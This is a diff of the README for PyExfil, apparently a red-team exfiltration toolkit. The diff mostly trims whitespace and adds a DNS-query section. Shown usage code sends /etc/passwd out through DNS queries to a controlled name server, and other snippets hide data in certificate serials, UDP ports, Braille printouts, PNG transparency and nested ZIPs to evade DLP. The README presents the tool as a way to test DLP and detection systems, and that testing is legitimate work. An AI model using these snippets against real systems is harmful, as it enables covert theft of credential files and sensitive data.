@@ -23,7 +23,7 @@ from pyexfil.purpose.module import Send
 ```
 
 ### Test Data Generation
-Although this tool was initially created as a game and later on turned to be a Red Team oriented tool, at the end of a day a major usage of `PyExfil` is to test various DLP (Data Leakage Protection) systems as well as detection of intrusion. To make this missions simpler we have created a little module to generate fake data with a structure that matches both PII and PCI data sets. These are intended to trigger alerts while being broadcated outside of the network. 
+Although this tool was initially created as a game and later on turned to be a Red Team oriented tool, at the end of a day a major usage of `PyExfil` is to test various DLP (Data Leakage Protection) systems as well as detection of intrusion. To make this missions simpler we have created a little module to generate fake data with a structure that matches both PII and PCI data sets. These are intended to trigger alerts while being broadcated outside of the network.
 
 Here is how to use it:
 ```python
@@ -31,9 +31,9 @@ from pyexfil.includes import CreateTestData
 
 c = CreateTestData(rows=1000, output_location="/tmp/list.csv")
 c.Run()
-``` 
+```
 
-After this you can use which ever `PyExfil` module you would like to try and exfiltrate the data set created. This way you can test your detection without risking exfiltrating valuable data. 
+After this you can use which ever `PyExfil` module you would like to try and exfiltrate the data set created. This way you can test your detection without risking exfiltrating valuable data.
 
 ### Network [mainly exfiltration]
 #### DNS Query
@@ -114,6 +114,23 @@ exfiltrator(ip_addr, "/etc/passwd", time_delay=0.1)
 # For Server (collecting)
 server("1.2.3.4")
 ```
+
+#### DNSQ
+Use DNS Queries to exfiltrate short bursts of communication or a full file. You must control the TLD for this to work. Listener must be executed on the DNS server.
+
+```python
+#!/usr/bin/env python3
+
+from pyexfil.network.DNSQ import Send, Broker
+
+
+a = Send(file_path='/etc/passwd', name_server='main.com', key=PYEXFIL_DEFAULT_PASSWORD)
+a.Exfiltrate()
+
+b = Broker(key=PYEXFIL_DEFAULT_PASSWORD, retFunc=_testCallBack, host='', port=53)
+b.Listen()
+```
+
 
 #### HTTPS Replace Certificate
 With this method you are configuring an HTTP server to impersonate the certificate. When you exfiltrate data, it will use the original server to exchange certificates with the duplicating server (port forwarding) and then, when this is complete, transmit the data with AES encryption but wraps it up as SSL Application Data as there is no real way of telling this.
@@ -512,7 +529,7 @@ print(a.Decode(output))
 
 #### UDP Sport
 
-UDP source port uses the source-port byte to send out `int`s with no body. Hopefully evading packet size detection mechanisms. 
+UDP source port uses the source-port byte to send out `int`s with no body. Hopefully evading packet size detection mechanisms.
 
 ```python
 
@@ -535,7 +552,7 @@ b = Broker(key, ip_addr="0.0.0.0", local_port=Broker.REMOTE_UDP_PORT)
 ```
 
 #### Certificate Exchange
-This module is exploiting the SSL certificate exchange mechanism. When a new SSL connection is established, a certificate is exchanged. This module will convert data into the value of the serial number of a certificate and then use SSL connection establishement (handshake) as the means to transport the certificate. This is very useful for transmitting short messages in a covert manner. Most firewalls and proxies should enable SSL communication. 
+This module is exploiting the SSL certificate exchange mechanism. When a new SSL connection is established, a certificate is exchanged. This module will convert data into the value of the serial number of a certificate and then use SSL connection establishement (handshake) as the means to transport the certificate. This is very useful for transmitting short messages in a covert manner. Most firewalls and proxies should enable SSL communication.
 
 ```python
 # Server
@@ -671,7 +688,7 @@ DecodeDictionary(originalVideo="video.mp4", dictionaryFile='output.map', outputF
 ```
 
 #### Braille Text Document
-This module can be very useful when you have only a printer at hand. It will try to avoid detection based on content by compressing the data, converting it to hex and then representing that in Braille to it is relatively easy to scan, use OCR and then convert back to the actual data. 
+This module can be very useful when you have only a printer at hand. It will try to avoid detection based on content by compressing the data, converting it to hex and then representing that in Braille to it is relatively easy to scan, use OCR and then convert back to the actual data.
 
 ```python
 #!/usr/bin/env python3
@@ -680,7 +697,7 @@ from pyexfil.Stega import braille
 braille.Send(file_path='/etc/passwd', to_file=True, to_screen=False)
 ```
 
-This will generate one `output.txt` file with the Braille text and one `output.pdf` file with the text aligned and ready to be printed. 
+This will generate one `output.txt` file with the Braille text and one `output.pdf` file with the text aligned and ready to be printed.
 
 To decode simply use:
 ```python
@@ -692,7 +709,7 @@ braille.Decode(data)
 ```
 
 #### PNG Transparency
-This little nifty module will take a PNG image file and embed the data you want to exfiltrate as the transparency bit (4th). It does mean that the image file needs to be big enough for large sets of data but for rapid-short-burst communication it can be very useful. 
+This little nifty module will take a PNG image file and embed the data you want to exfiltrate as the transparency bit (4th). It does mean that the image file needs to be big enough for large sets of data but for rapid-short-burst communication it can be very useful.
 
 ```python
 #!/usr/bin/env python3
@@ -704,10 +721,10 @@ encodingWrapper.Run()
 
 decodingWrapper = Decode(key="ABC123456", file_path='output.png')
 print(decodingWrapper.Run())
-``` 
+```
 
 #### ZIP Loop
-This module is not specifically for steganography but was put here as it is the best fit. The idea is that many DLP scanners will not pass beyond the 1k iterations of decompressing ZIP files to avoid overhead. This uses a big random number of iterations resulting in a significantly larger output that should go unnoticed by some DLP mechanisms. 
+This module is not specifically for steganography but was put here as it is the best fit. The idea is that many DLP scanners will not pass beyond the 1k iterations of decompressing ZIP files to avoid overhead. This uses a big random number of iterations resulting in a significantly larger output that should go unnoticed by some DLP mechanisms.
 
 ```python3
 
